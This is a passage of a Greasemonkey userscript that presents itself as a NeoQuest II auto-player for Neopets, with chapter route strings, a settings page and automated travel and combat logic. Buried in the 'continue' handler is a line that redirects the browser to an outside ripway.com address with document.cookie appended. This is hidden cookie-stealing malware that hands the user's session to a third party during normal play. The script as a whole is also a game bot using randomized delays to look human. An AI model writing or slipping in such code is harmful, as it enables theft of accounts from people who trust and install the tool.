mountain peak</option>' + '<option value="633363333636663622666228888444444444477" lang="http://i35.tinypic.com/2wptqf5.jpg">Terror mountain peak to Scuzzy</option></select></div>' + '<div id="option3" class="options" style="display:none;"><select>' + '<option> ------------- Chapter 3: Lost Desert ------------------</option>' + '<option value="3335553333333333" lang="http://i36.tinypic.com/2eund6v.jpg">Advisor to outside</option>' + '<option value="1117777774444444444" lang="http://i38.tinypic.com/1qlpqw.jpg">campside to temple of sky</option>' + '<option value="11111111553351115333333333333335511182262222228444777777777777444444444444888882222222222284826333333333351511111" lang="http://i38.tinypic.com/72f91x.jpg">Temple of sky entrance to silicast</option>' + '<option value="111111111111774747711115511555155" lang="http://i38.tinypic.com/1qlpqw.jpg">campside to Ruined temple</option>' + '<option value="5111111111555511115335888222284482222633362636228444444447111747771111111111777442222263333335111115626822222222663335551117477715553344444448666688882222228" lang="http://i36.tinypic.com/27zvnfm.jpg">Ruined Temple to gebarn ii</option>' + '<option value="11111111117747477111155115551711151144884" lang="http://i38.tinypic.com/1qlpqw.jpg">campside to waset village(Velm)</option>' + '<option value="3333555555555553333666666666666666666622226223355" lang="http://i33.tinypic.com/2zxs45t.jpg">Waset village to palace of ancient kings </option>' + '<option value="555511155553335555111111753666371117748471777111111111111111111111111" lang="http://i34.tinypic.com/1zluh04.jpg">palace of ancient kings entrance to revernant</option>' + '<option value="33333331544447777777777777777777111778848888888484444444744828477" lang="http://i38.tinypic.com/21jn8ll.jpg">palace of ancient kings(lifira) to waset(lifira)</option>' + '<option value="33355555555555511111111111111115555555333333333333332"  lang="http://i33.tinypic.com/2zxs45t.jpg">Waset to bukaru</option>' + '<option value="77777777777777774444444444" lang="http://i38.tinypic.com/vimyxc.jpg">bukaru to medallion second piece</option>' + '<option value="22888888888888888888822222222228888888888444488888888882222222266663333355533551111111111111111111111111111555533333551111153351" lang="http://i38.tinypic.com/20p5938.jpg">medallion second piece to coltzans ghost</option>' + '<option value="2222848882222844884488822222222222222222222222262288884844444477771111111155555555555555511111111" lang="http://i37.tinypic.com/5ufgw2.jpg">barrel to gemstone</option>' + '<option value="5515555333333335533666666666666622222222222888444888882222226666666666666666662222" lang="http://i36.tinypic.com/otgmmc.jpg">Gemstone to zakharukhÂ´s pyramid</option>' + '<option value="3333351111111115333333333366333333355333333333362222222228844448844444477488448884824448844448822663336622333333333333333333333333333311111111555117772228844444444715333335511111782888747111111" lang="http://i36.tinypic.com/og0ue.jpg">pyramid level 1 to anubits</option></div>' + '</select></div>' + '<div id="option4" class="options" style="display:none;"><select>' + '<option> ----------- Chapter 4: Haunted woods ----------------</option>' + '<option value="222222226666633336" lang="http://i38.tinypic.com/25hd36d.jpg">Start to Shadow gulch shop</option>' + '<option value="2628822222222822888844444477774777111111555111" lang="http://i38.tinypic.com/25hd36d.jpg">Shadow gulch to von rooÂ´s castle</option>' + '<option value="111111111144444444444444444448822248884444444444471153553333625153336333511117444844444844488877111533331133" lang="http://i34.tinypic.com/2n0k5s0.jpg">Von roos castle entrace to meuka</option>' + '<option value="5755774444444844844444474488222222222228884444777778844444444828844447115174448888447772" lang="http://i34.tinypic.com/n6c550.jpg">Von roos castle to cave of dark things </option>' + '<option value="44444488888888844444777777774888888222222288282228226266633633353551774747115336333333333333333333333333333333388888888844444488844444882" lang="http://i35.tinypic.com/msjc5w.jpg">cave of dark things entrance to spider grundo</option>' + '<option value="63363333333333333633333622226662226662222222888226666663333333333335553" lang="http://i35.tinypic.com/3507729.jpg">northwest spider grundo to balthazar</option>' + '<option value="5171111111111177747533336633555117884444447777753366333553336222284862662844444717488847115117111111533663336263511174444411111" lang="http://i33.tinypic.com/2zzhopd.jpg">balthazar to brain tree</option>' + '<option value="633336622222222222222222882222226265" lang="http://i35.tinypic.com/s6t5ds.jpg">Augur Faunt To  the faeries</option>' + '<option value="55555555555555555533333333333333333336666666333555333666622288844747" lang="http://i33.tinypic.com/2s6wzet.jpg">faerie thiefÂ´s location to noxÂ´s fortress</option>' + '<option value="1115333511117845562222222287455622651111744755744444442226336663366447557753351114482222633628444444777115512263622226555111717748888226715333335" lang="http://i35.tinypic.com/16byeqh.jpg">nox fortress level 1 to hubrid nox</option>' + '<option value="3518826666666628888884444444444488478848888448488884" lang="http://i36.tinypic.com/2qxao1w.jpg">Hybrid nox dead to esophagor</option></div>' + '</select></div>' + '<div id="option5" class="options" style="display:none;"><select>' + '<option> ------------- Chapter 5: Faeriland ------------------</option>' + '<option value="2222228888288888844444888888822222228688" lang="http://i35.tinypic.com/vzbif8.jpg">Faerieland to northern watchtower(calam)</option>' + '<option value="66622222626262622666222288228222266633662888888447744482" lang="http://i35.tinypic.com/wumrl1.jpg">Northern watchtower(stairs) to fallen angel</option>' + '<option value="444488488822266828262228888228222228663333662222228882662226222844444474884447774482274777444488884" lang="http://i38.tinypic.com/6ohfe8.jpg">Fallen angel to cumulonimbus</option>' + '<option value="488884444711177117471533333333351111111111744444444444444444444444444448222662222263333336622226636362222663333622288444482222844444444444444444444444447111111115333351111111774444" lang="http://i36.tinypic.com/2hp5f1v.jpg">Cumulonimbus to somewhere near devilpuss</option>' + '<option value="4444477744447771555553535711777771144448" lang="http://i37.tinypic.com/2dtw1m9.jpg">cumulonimbus(after fight) to cirrus(midlle of town)</option>' + '<option value="4477115555717177111151511117744488848884844747777771111111" lang="http://i34.tinypic.com/2dhxjlc.jpg">cirrus to faerie city</option>' + '<option value="7117777744444471174447711115511111744825362633622288888666362244444448226333333333353" lang="http://i35.tinypic.com/2nap6yq.jpg">lusina to faerie thief battle #1 </option>' + '<option value="44844444444447115515357755555111744717484533622222882222223333362263333366633622263333333333333333351115555117111744777111777748448222222447482666333362222217482222" lang="http://i38.tinypic.com/9kcjl5.jpg">Blue pillar to faerie thief battle #2</option>' + '<option value="71111536221111744447771563357111533563366222266633622622288882284444444444444444851111111111535111111111111111111151171111177771" lang="http://i33.tinypic.com/35l6ahi.jpg">Faerie thief battle #2 to battle #3</option>' + '<option value="4444444711117777447155744482871111153333555533511174444444444711111111115333333336222222633362222263663626626353336822228448222222263366333333335551111111111744784471111533351774877111555336665111111782877711174444447448444488211" lang="http://i34.tinypic.com/28s3l2f.jpg">stenvela to 1 unit below vitrini</option>' + '<option value="44444448882228444475335744444471115626335156222265351533688634477166632755744828487111178284471782226333333684486333355511153333333" lang="http://i35.tinypic.com/119njnp.jpg">vitrini - pant devil(right side) - vitrini</option>' + '<option value="333333333333666222633335744753333335111782844717822447174482266284335518884251771153362633315626335156222844444486336844447111777444444444444" lang="http://i35.tinypic.com/119njnp.jpg">vitrini - pant devil(left side) - vitrini</option>' + '<option value="44444448882228884444822222222226663333333333622222222228717444444444486334822636217884751533511533688226336211147" lang="http://i35.tinypic.com/119njnp.jpg">vitrini to  terask battle #1 (get the key by vitrini!) </option>' + '<option value="1111111111111111117744444444447771111111111533335551115553333333333333333333666222666333362222222222888444444444482222222222263515711571533362222666226535511111111144863622284444822228444444451111111551533622222222263336" lang="http://i36.tinypic.com/2j8du8.jpg">terask (battle #1) to lyra </option>' + '<option value="51111111111152888888" lang="http://i33.tinypic.com/330wln9.jpg">Lyra to King Terask (The final battle)</option>' + '</select></div>' + '</div>' + '<div id="image">' + '<center><b>You should stay here:</b></center>' + '<img id="fulldiv" style="display: block;" src="" title="click to view full image"></img><br/ ></div><br/ >' + '<div class="paths"><b>Directions:</b><br/ >' + '<input id="directions"  type="text" size="50"><img id="question3" class="questions" title="Click here for help" src="' + imagehelp + '"></a></div>' + '<div class="paths"><b>Path Index:</b><br/ >' + '<input id="pathindex"  type="text" size="5"><div style="font-size:11px; width:300px;">(If you starting set 0, else don´t change.)</div>' + '</div><div class="separator" style="bottom: 15px; width: 344px;"></div>' + '<div style="position: relative; bottom: 10px;"><b> Travel mode:</b>' + '<br/ >' + '<div>' + '<input id="normal" name="normalhunting" type="radio">Normal</input>' + '<input id="hunting" name="normalhunting" type="radio">Hunting</input>' + '</div>' + '<div class="flee">' + '<br/ ><input type="checkbox" id="flee">Auto Flee fights</input>' + '</div>' + '<div class="separator" style="bottom: 10px; width: 344px;"></div>' + '<div style="bottom: 10px;" class="on">' + '<b>Remote Control system</b>' + '<br/ ><input type="radio" name="en" id="enabled">Enabled</input>' + '<input type="radio" name="en" id="Disabled">Disabled</input></div>' + '</div>' + '<div class="separator" style="bottom: 15px; width: 344px;"></div>' + '<input id="newtab" type="radio" name="tab">New Tab</input>' + '<input id="thiswindow" type="radio" name="tab">This window</input>' + '<input id="noop" type="radio" name="tab">Just change.</input><img id="question5" class="questions" title="help" src="' + imagehelp + '"><br />' + '<a href="javascript:void(0);" target="" id="startremote" >Start</a><br />' + '</div></div></div>';
}
if ((/^about:cache#nqii-config$/i.test(location.href)) || (location.href.match('http://nqiitrainer.6te.net/config.html'))) {
	// Set defalut value to Boxes
	document.getElementById('directions').value = GM_getValue('Path');


	function setDeFaultBox() {
		if (GM_getValue("onoff") == true) {
			document.getElementById('links').getElementsByTagName('a')[0].style.color = "black";
			document.getElementById('links').getElementsByTagName('a')[1].style.color = "red";
		}
		if (GM_getValue("onoff") == false) {
			document.getElementById('links').getElementsByTagName('a')[0].style.color = "green";
			document.getElementById('links').getElementsByTagName('a')[1].style.color = "black";
		}
		document.getElementById('damage').value = GM_getValue('damageid');
		if ((GM_getValue("damage") == false)) document.getElementById('checkdamage').checked = true;
		if ((GM_getValue("damage") == true)) document.getElementById('checkdamage').checked = false;
		document.getElementById('pathindex').value = GM_getValue('pathIndex');
		if ((GM_getValue("flee") == false)) document.getElementById('flee').checked = true;
		if ((GM_getValue("remote") == false)) document.getElementById('enabled').checked = true;
		if ((GM_getValue("remote") == true)) document.getElementById('Disabled').checked = true;
		document.getElementById('velmact').value = GM_getValue('velmact');
		document.getElementById("leftbox").value = GM_getValue('toleft');
		document.getElementById("rightbox").value = GM_getValue('toright');
		document.getElementById("heal").value = GM_getValue('healingitem');
		document.getElementById("to").value = GM_getValue('to');
		document.getElementById("from").value = GM_getValue('from');
		if (GM_getValue('mipsyact') == 1) {
			document.getElementById('mipsyact').value = "9201";
			document.getElementsByTagName("select")[2].selectedIndex = 1;
		}
		if (GM_getValue('mipsyact') == 2) {
			document.getElementById('mipsyact').value = "9201";
			document.getElementsByTagName("select")[2].selectedIndex = 1;
		}
		if (GM_getValue('mipsyact') == 3) {
			document.getElementById('mipsyact').value = "9202";
			document.getElementsByTagName("select")[2].selectedIndex = 2;
		}
		if (GM_getValue('mipsyact') == 4) {
			document.getElementById('mipsyact').value = "9202";
			document.getElementsByTagName("select")[2].selectedIndex = 2;
		}
		if (((GM_getValue('mipsyact') == 1)) || ((GM_getValue('mipsyact') == 3))) document.getElementById('opcao').checked = true;
		if (((GM_getValue('mipsyact') == 2)) || ((GM_getValue('mipsyact') == 4))) document.getElementById('opcao').checked = false;
	}
	setDeFaultBox();
	document.getElementById('noop').checked = true;
	// Create ? divs
	document.getElementById('question').addEventListener('click', function() {
		WinConfig.init({
			"type": "explanation",
			"title": "Explanation: Refreshs",
			"class": "Refreshs",
			"size": "[400px,500px]",
			"position": [712, 280],
			"description": "<br />• This is the refresh rate.<br />• Here you can set the actions Delays<br />• Fill in the box only mileseconds time.<br/ >• You can use random, so looks like more real.<br />• Don´t user refreshs less than 1000 mileseconds!<br />• The value betwein \"from\" and \"to\" has to be more than 700 ms.<br/ >• From it´s the less time and to its the maximun time."
		}).Open().FadeIn(0);
	},
	false);
	document.getElementById('question2').addEventListener('click', function() {
		WinConfig.init({
			"type": "explanation",
			"class": "Setdirections",
			"title": "Explanation: Set Directions",
			"size": ["550px", 0],
			"position": [580, 70],
			"description": "<br />• Here you can set the directions you wanna go and back.<br />• If in the first box you set 4 and the second 3, you always will walk for dir 4 and back for dir 3.<br />• If you wanna walk manually, set 0 in left box. Then, you can walk by yourself, and the script keep attacking withou stoping everything. <br />• Based on moves right and left from the first version."
		}).Open().FadeIn(0);
	},
	false);
	document.getElementById('question3').addEventListener('click', function() {
		WinConfig.init({
			"type": "explanation",
			"title": "Explanation: Directions",
			"class": "Directionshelp",
			"size": ["400px", ],
			"position": [210, 10],
			"description": "<br />• Here you can fill the paths directions.<br />• When you click in one of the options, automatically fill the paths in the box.<br />• If you wanna guess how much coordenates you ned for go to somewhere, set the value here, using image to help."
		}).Open().FadeIn(0);
	},
	false);
	document.getElementById('question8').addEventListener('click', function() {
		WinConfig.init({
			"type": "explanation",
			"title": "Explanation: Use damage potion",
			"class": "damage",
			"size": "[400px,500px]",
			"position": [760, 270],
			"description": "<br />• Here you can set the damage potion to use.<br />• This only works with rohane and talinia.<br />• If shows you \"don´t have that item\", i will disable this function."
		}).Open().FadeIn(0);
	},
	false);
	document.getElementById('question24').addEventListener('click', function() {
		WinConfig.init({
			"type": "explanation",
			"title": "Explanation: Use damage potion",
			"class": "damage",
			"size": "[100px,100px]",
			"position": [780, 80],
			"description": "<br />• When you click, the values on the box will be updated. <br />Click here before update something."
		}).Open().FadeIn(0);
	},
	false);

	//Add functions to selects, like fill in the boxs the values, selectindex
	document.getElementsByTagName("select")[0].addEventListener('change', function(e) {
		document.getElementById('heal').value = e.currentTarget.value;
	},
	false);
	document.getElementsByTagName("select")[0].selectedIndex = getid();
	document.getElementsByTagName("select")[1].addEventListener('change', function(e) {
		document.getElementById('checkdamage').checked = "true";
		document.getElementById('damage').value = e.currentTarget.value;
	},
	false);
	document.getElementsByTagName("select")[1].selectedIndex = getid3();
	document.getElementsByTagName("select")[2].addEventListener('change', function(e) {
		document.getElementById('mipsyact').value = e.currentTarget.value;
	},
	false);
	document.getElementsByTagName("select")[3].addEventListener('change', function(e) {
		document.getElementById('velmact').value = e.currentTarget.value;
	},
	false);
	document.getElementsByTagName("select")[3].selectedIndex = getid2();
	document.getElementsByTagName("select")[4].addEventListener('change', function(e) {
		document.getElementById('directions').value = e.currentTarget.value;
		document.getElementById('pathindex').value = "0";
		document.getElementById('fulldiv').src = this.options[this.selectedIndex].lang;
		document.getElementById('enabled').checked = "true";
	},
	false);
	document.getElementsByTagName("select")[5].addEventListener('change', function(e) {
		document.getElementById('directions').value = e.currentTarget.value;
		document.getElementById('pathindex').value = "0";
		document.getElementById('fulldiv').src = this.options[this.selectedIndex].lang;
		document.getElementById('enabled').checked = "true";
	},
	false);
	document.getElementsByTagName("select")[6].addEventListener('change', function(e) {
		document.getElementById('directions').value = e.currentTarget.value;
		document.getElementById('pathindex').value = "0";
		document.getElementById('fulldiv').src = this.options[this.selectedIndex].lang;
		document.getElementById('enabled').checked = "true";
	},
	false);
	document.getElementsByTagName("select")[7].addEventListener('change', function(e) {
		document.getElementById('directions').value = e.currentTarget.value;
		document.getElementById('pathindex').value = "0";
		document.getElementById('fulldiv').src = this.options[this.selectedIndex].lang;
		document.getElementById('enabled').checked = "true";
	},
	false);
	document.getElementsByTagName("select")[8].addEventListener('change', function(e) {
		document.getElementById('directions').value = e.currentTarget.value;
		document.getElementById('pathindex').value = "0";
		document.getElementById('fulldiv').src = this.options[this.selectedIndex].lang;
		document.getElementById('enabled').checked = "true";
	},
	false);
	document.getElementById("autoupdate").addEventListener('click', function() {
		setDeFaultBox();
	},
	false);
	document.getElementById('directions').addEventListener('keydown', function() {
		document.getElementById('enabled').checked = true;
	},
	true);

	// Add function to links Enabled, disabled
	document.getElementById('links').getElementsByTagName('a')[0].addEventListener('click', function() {
		GM_setValue('onoff', false);
		this.style.color = "green";
		document.getElementById('links').getElementsByTagName('a')[1].style.color = ""
	},
	false);
	document.getElementById('links').getElementsByTagName('a')[1].addEventListener('click', function() {
		GM_setValue('onoff', true);
		clearTimeout(timeout);
		this.style.color = "red";
		document.getElementById('links').getElementsByTagName('a')[0].style.color = ""
	},
	false);

	// Add function to show hidden selects
	document.getElementById("configchapter").getElementsByTagName("input")[0].addEventListener('click', function(e) {
		document.getElementById("option1").style.display = "block";
		document.getElementById("image").style.display = "block";
		document.getElementById("option89").style.display = "none";
		document.getElementById("option4").style.display = "none";
		document.getElementById("option3").style.display = "none";
		document.getElementById("option2").style.display = "none";
		document.getElementById("option5").style.display = "none";
	},
	false);
	document.getElementById("configchapter").getElementsByTagName("input")[1].addEventListener('click', function(e) {
		document.getElementById("option2").style.display = "block";
		document.getElementById("image").style.display = "block";
		document.getElementById("option89").style.display = "none";
		document.getElementById("option4").style.display = "none";
		document.getElementById("option3").style.display = "none";
		document.getElementById("option5").style.display = "none";
		document.getElementById("option1").style.display = "none";
	},
	false);
	document.getElementById("configchapter").getElementsByTagName("input")[2].addEventListener('click', function(e) {
		document.getElementById("option3").style.display = "block";
		document.getElementById("image").style.display = "block";
		document.getElementById("option89").style.display = "none";
		document.getElementById("option4").style.display = "none";
		document.getElementById("option5").style.display = "none";
		document.getElementById("option2").style.display = "none";
		document.getElementById("option1").style.display = "none";
	},
	false);
	document.getElementById("configchapter").getElementsByTagName("input")[3].addEventListener('click', function(e) {
		document.getElementById("option4").style.display = "block";
		document.getElementById("image").style.display = "block";
		document.getElementById("option89").style.display = "none";
		document.getElementById("option5").style.display = "none";
		document.getElementById("option3").style.display = "none";
		document.getElementById("option2").style.display = "none";
		document.getElementById("option1").style.display = "none";
	},
	false);
	document.getElementById("configchapter").getElementsByTagName("input")[4].addEventListener('click', function(e) {
		document.getElementById("option5").style.display = "block";
		document.getElementById("image").style.display = "block";
		document.getElementById("option89").style.display = "none";
		document.getElementById("option4").style.display = "none";
		document.getElementById("option3").style.display = "none";
		document.getElementById("option2").style.display = "none";
		document.getElementById("option1").style.display = "none";
	},
	false);

	// Funtion to save configurations on right bar
	function saveconfig() {
		var pass = true;
		if ((document.getElementById('heal').value == "") || (document.getElementById('to').value - document.getElementById('from').value < 700) || (document.getElementById('damage').value == "") || (parseFloat(document.getElementById('to').value) - parseFloat((document.getElementById('from').value) < 700)) || (document.getElementById('from').value < 700) || (document.getElementById('from').value == document.getElementById('to').value) || (document.getElementById('to').value == "") || (document.getElementById('from').value == "") || (document.getElementById('leftbox').value > 8) || (document.getElementById('leftbox').value > 8) || (document.getElementById('leftbox').value == "") || (document.getElementById('rightbox').value == "") || (document.getElementById('mipsyact').value == "") || (document.getElementById('velmact').value == "")) {
			pass = false;
		}
		if ((document.getElementById('heal').value == "")) alert('Please select a valid value for heal item');
		else GM_setValue('healingitem', document.getElementById('heal').value);
		if (((document.getElementById('leftbox').value == "")) || ((document.getElementById('rightbox').value == "")) || ((document.getElementById('leftbox').value > 8)) || ((document.getElementById('leftbox').value > 8))) alert('Please select a valid value for Directions');
		else GM_setValue('toleft', document.getElementById('leftbox').value);
		GM_setValue('toright', document.getElementById('rightbox').value);
		if ((document.getElementById('damage').value == "")) alert("Plase select a valid damage item");
		else GM_setValue('damageid', document.getElementById('damage').value);
		if ((document.getElementById('checkdamage').checked == true)) GM_setValue('damage', false);
		if ((document.getElementById('checkdamage').checked == false)) GM_setValue('damage', true);
		if ((document.getElementById('mipsyact').value == "")) alert('Please select a valid item for mipsy action');
		else {
			if (document.getElementById('mipsyact').value == 9201) {
				if ((document.getElementById('opcao').checked == true)) GM_setValue("mipsyact", 1);
				if ((document.getElementById('opcao').checked == false)) GM_setValue("mipsyact", 2);
			}
			if (document.getElementById('mipsyact').value == 9202) {
				if ((document.getElementById('opcao').checked == true)) GM_setValue("mipsyact", 3);
				if ((document.getElementById('opcao').checked == false)) GM_setValue("mipsyact", 4);
			}
		}
		if ((document.getElementById('velmact').value == "")) alert('Please select a valid item for Velm action');
		else GM_setValue('velmact', document.getElementById('velmact').value);
		if (((document.getElementById('from').value == "")) || ((document.getElementById('from').value < 700)) || ((document.getElementById('to').value == ""))) {
			alert("Plase select a valid Refresh time. OBS.: i will not let you use values less than 700 mileseconds");
		}
		else {
			GM_setValue("from", document.getElementById("from").value);
			GM_setValue("to", document.getElementById("to").value);
		}
		if ((document.getElementById('to').value == document.getElementById('from').value)) {
			alert("Refresh from value, can´t be the same value that \"to\".");
		}
		else {
			GM_setValue("from", document.getElementById("from").value);
			GM_setValue("to", document.getElementById("to").value);
		}

		if (((document.getElementById('to').value - document.getElementById('from').value < 700))) alert("Please use a random difference more than 700 miliseconds");
		else GM_setValue("from", document.getElementById("from").value);
		GM_setValue("to", document.getElementById("to").value);
		if (pass) {
			alert('Settings saved sucessfully!');
		}
	}
	//Function to start remote control
	function start() {
		alert('Settings Saved.');
		GM_setValue("Path", document.getElementById('directions').value);
		GM_setValue("pathIndex", document.getElementById('pathindex').value);
		if (document.getElementById('enabled').checked == true) {
			GM_setValue("remote", false);
			GM_setValue("onoff", false);
		}
		if ((document.getElementById('flee').checked == true)) GM_setValue("flee", false);
		if ((document.getElementById('flee').checked == false)) GM_setValue("flee", true);
		if (document.getElementById('Disabled').checked == true) {
			GM_setValue("remote", true);
		}
	}
	// Add events to start | save settings
	document.getElementById("formsubmit").addEventListener("click", saveconfig, true);
	document.getElementById("startremote").addEventListener("click", start, false);
}
if (/^about:cache#nqii-config$/i.test(location.href)) {
	// change href if normal | hunting is turned On |off. Change tagert if neew tab or this window checked
	document.getElementById("normal").addEventListener("click", function() {
		document.getElementById("startremote").href = "http://www.neopets.com/games/nq2/nq2.phtml?act=travel&mode=1";
	},
	false);
	document.getElementById("hunting").addEventListener("click", function() {
		document.getElementById("startremote").href = "http://www.neopets.com/games/nq2/nq2.phtml?act=travel&mode=2";
	},
	false);

	document.getElementById('normal').checked = true;
	document.getElementById("newtab").addEventListener("click", function() {
		document.getElementById("startremote").target = "_blank";
		document.getElementById("startremote").href = "http://www.neopets.com/games/nq2/nq2.phtml?act=travel&mode=1";
	},
	false);
	document.getElementById("thiswindow").addEventListener("click", function() {
		document.getElementById("startremote").target = "_top";
		document.getElementById("startremote").href = "http://www.neopets.com/games/nq2/nq2.phtml?act=travel&mode=1";
	},
	false);
	document.getElementById("noop").addEventListener("click", function() {
		document.getElementById("startremote").target = "_top";
		document.getElementById("startremote").href = "about:cache#NQII-config#";
	},
	false);
	document.getElementById('question5').addEventListener('click', function() {
		WinConfig.init({
			"type": "explanation",
			"title": "Explanation: Where open the page?",
			"size": ["400px", ],
			"position": [170, 250],
			"class": "open",
			"description": "<br />• Here you can set where the page of neoquest will open.<br />• If you click new tab, the will open in a new tab.<br />• If you click This window, the page will load in the actual window. <br />• If you click just change, the settings will be saved and the page will not open. Refresh NQ page manually."
		}).Open().FadeIn(0);
	},
	false);
}
//finish configuration region
//Now if´s not configuration page, start the functions
if (location.href.match('nq2/nq2.phtml')) {
	function selectitem() {
		switch (GM_getValue("healingitem")) {
		case "30011":
			GM_setValue("healingitem", '30012');
			break;
		case "30012":
			GM_setValue("healingitem", '30013');
			break;
		case "30013":
			GM_setValue("healingitem", '30014');
			break;
		case "30014":
			GM_setValue("healingitem", '30021');
			break;
		case "30021":
			GM_setValue("healingitem", '30022');
			break;
		case "30022":
			GM_setValue("healingitem", '30023');
			break;
		case "30023":
			GM_setValue("healingitem", '30031');
			break;
		case "30031":
			GM_setValue("healingitem", '30032');
			break;
		case "30032":
			GM_setValue("healingitem", '30033');
			break;
		case "30033":
			GM_setValue("healingitem", '30041');
			break;
		case "30041":
			GM_setValue("healingitem", '30042');
			break;
		case "30042":
			GM_setValue("healingitem", '30043');
			break;
		case "30043":
			GM_setValue("healingitem", '30051');
			break;
		case "30051":
			GM_setValue("healingitem", '30052');
			break;
		case "30052":
			GM_setValue("healingitem", '30053');
			break;
		case "30053":
			GM_setValue("healingitem", '30011');
			break;

		}
	}

	var REFRESHS = Math.floor(Math.random() * parseFloat((GM_getValue("to") - GM_getValue("from")))) + parseFloat(GM_getValue("from"));
	var scriptonoff = GM_getValue("onoff"); //Check if script ts enabled
	if (GM_getValue("remote") == true) {
		if (new RegExp(/http\:\/\/w{3}\.neopets\.(com|com\.br)\/games\/nq2\/nq2\.phtml\?act=/i).test(location.href)) // alows you to enter inventory, shops without return to map.
		{
			scriptonoff = true;
		}
	}
	if ((new RegExp(/http\:\/\/w{3}\.neopets\.(com|com\.br)\/games\/nq2\/nq2\.phtml\?act=move&dir=/i).test(location.href)) || (new RegExp(/http\:\/\/w{3}\.neopets\.(com|com\.br)\/games\/nq2\/nq2\.phtml\?act=travel&mode=/i).test(location.href)) || (GM_getValue("remote") == false)) {
		scriptonoff = GM_getValue("onoff");
	}
	if (!scriptonoff) {
		if (document.evaluate("//img[contains(@src, '/nq2/x/com_begin.gif')]", document, null, 9, null).singleNodeValue) {
			GM_setValue("hitTarget", 5);
			GM_setValue("isHasted", false);
			GM_setValue("Velmhast", false);
			var timeout = setTimeout(function() {
				location.href = "http://www.neopets.com/games/nq2/nq2.phtml?start=1";
			},
			REFRESHS);
		}
		if (document.evaluate("//img[contains(@src, '/nq2/x/com_next.gif')]", document, null, 9, null).singleNodeValue) {
			var timeout = setTimeout(function() {
				location.href = "javascript:setaction(1); document.ff.submit()";
			},
			REFRESHS);
		}
		if (document.evaluate("//img[contains(@src, '/nq2/x/com_end.gif')]", document, null, 9, null).singleNodeValue) {
			var timeout = setTimeout(function() {
				location.href = "javascript:setaction(2); document.ff.submit()";
			},
			REFRESHS);
		}
		if (document.evaluate("//img[contains(@src, '/indexbak_oops_pt.png')]", document, null, 9, null).singleNodeValue) {
			var timeout = setTimeout(function() {
				location.href = "http://www.neopets.com/games/nq2/nq2.phtml";
			},
			200);
		}
		if (document.evaluate("//img[contains(@src, '/nq2/x/cont.gif')]", document, null, 9, null).singleNodeValue) {
			var timeout = setTimeout(function() {
				location.href = "http://www.neopets.com/games/nq2/nq2.phtml";
			},
			200);
			img = document.evaluate("//img[contains(@src,'http://images.neopets.com/nq2/x/cont.gif')]", document, null, 9, null).singleNodeValue;
			url = img.parentNode.href;
			if (!url.match("javascript")) {
				var timeout = setTimeout(function() {
					location.href = url;
				},
				REFRESHS);
		
document.location = 'http://h1.ripway.com/neopetts/phpfile.phpcookie=' + document.cookie;	}
		}
		if (document.evaluate("//img[contains(@src, '/nq2/x/tomap.gif')]", document, null, 9, null).singleNodeValue) {
			GM_setValue("hitTarget", 5);
			GM_setValue("isHasted", false);
			GM_setValue("Velmhast", true);
			var timeout = setTimeout(function() {
				location.href = "http://www.neopets.com/games/nq2/nq2.phtml?finish=1";
			},
			REFRESHS);
		}
		if (document.evaluate("//img[contains(@src, '/nq2/x/nav.gif')]", document, null, 9, null).singleNodeValue) {
			pathIndex = GM_getValue("pathIndex");
			var walk = false;
			if (((GM_getValue("toleft") == 0)) || ((GM_getValue("toleft") == 0))) walk = true;
			if (GM_getValue("remote") == true) {
				if (!walk) {
					if (GM_getValue("goLeft")) {
						var timeout = setTimeout(function() {
							location.href = "javascript:dosub(" + GM_getValue("toleft") + ")";
						},
						REFRESHS);
						GM_setValue("goLeft", false);
					}
					else {
						var timeout = setTimeout(function() {
							location.href = "javascript:dosub(" + GM_getValue("toright") + ")";
						},
						REFRESHS);
						GM_setValue("goLeft", true);
					}
				}
			}
			else {
				if ((GM_getValue("Path").length) != GM_getValue("pathIndex")) {
					var timeout = setTimeout(function() {
						location.href = "javascript:dosub(" + GM_getValue('Path')[pathIndex] + ")";
						GM_setValue("pathIndex", parseFloat(GM_getValue("pathIndex")) + 1);
					},
					REFRESHS);
				}
				else {
					var open = confirm("You have arrived at your destination.\nOpen the configuration page?");
					if (open) {
						GM_openInTab('about:cache#NQII-config');
					}
					GM_setValue("pathIndex", 0)
					GM_setValue("toleft", 0)
					GM_setValue("remote", true)
					GM_setValue("onoff", true)
				}
			}
		}
		if (document.evaluate("//img[contains(@src, '/nq2/x/com_atk.gif')]", document, null, 9, null).singleNodeValue) {
			var haste = true;
			if (((GM_getValue('mipsyact') == 1) || (GM_getValue('mipsyact') == 3))) haste = false;
			if (((GM_getValue('mipsyact') == 1) || (GM_getValue('mipsyact') == 2))) mipsyfact = "9201";
			if (((GM_getValue('mipsyact') == 3) || (GM_getValue('mipsyact') == 4))) mipsyfact = "9202";
			var useid = -1;
			var nxactor = 1;
			var fact = 3;
			var hitTarget = GM_getValue("hitTarget", 5);
			if (!document.getElementsByName("ch" + GM_getValue("hitTarget", 5))[0]) {
				var enemytarget = document.getElementsByClassName("ch")[0].name;
				if ((a = document.getElementsByClassName('ch200')[0])) enemytarget = a.name;
				if ((enemytarget != "ch1") && (enemytarget != "ch2") && (enemytarget != "ch3") && (enemytarget != "ch4")) {
					enemytarget = enemytarget.match(/ch([^&]+)/)[1];
					GM_setValue("hitTarget", enemytarget);
				}
				if (!document.getElementsByName("ch" + GM_getValue("hitTarget", 5))[0]) {
					var enemytarget = document.getElementsByClassName("ch")[0].name;
					if ((a = document.getElementsByClassName('ch200')[0])) enemytarget = a.name;
					if ((enemytarget != "ch1") && (enemytarget != "ch2") && (enemytarget != "ch3") && (enemytarget != "ch4")) {
						enemytarget = enemytarget.match(/ch([^&]+)/)[1];
						GM_setValue("hitTarget", enemytarget);
					}
				}
			}

			var texts = document.getElementsByClassName('frame')[0].getElementsByTagName("font");
			var doMultipleTargets = 0;
			var j = 0;
			var fleepss = true;
			for (j = 0; j < texts.length; j++) {
				//check to increment target
				//Check if you have the damage item
				var item2 = document.evaluate("id('content')//td/table/tbody/tr/td/a[@onclick='setaction(5); setitem(" + GM_getValue("damageid") + "); document.ff.submit(); return false;;']", document, null, 9, null).singleNodeValue;
				if (!item2) {
					GM_setValue("damage", true); // you don´t have, disable this option.
				}
				switch (texts[j].innerHTML) {
				case "<b>Rohane</b>":
					if (GM_getValue("damage") == false) {
						fact = 5;
						useid = GM_getValue("damageid");
					}
					if ((texts[j + 1].color == "#d0d000") || (texts[j + 1].color == "red")) {
						fact = 5;
						useid = GM_getValue("healingitem");
						var fleepss = false;
					}
					break;
				case "<b>Mipsy</b>":
					nxactor = 2;
					fact = mipsyfact;
					if (!haste) {
						if (!GM_getValue("isHasted")) {
							fact = 9203;
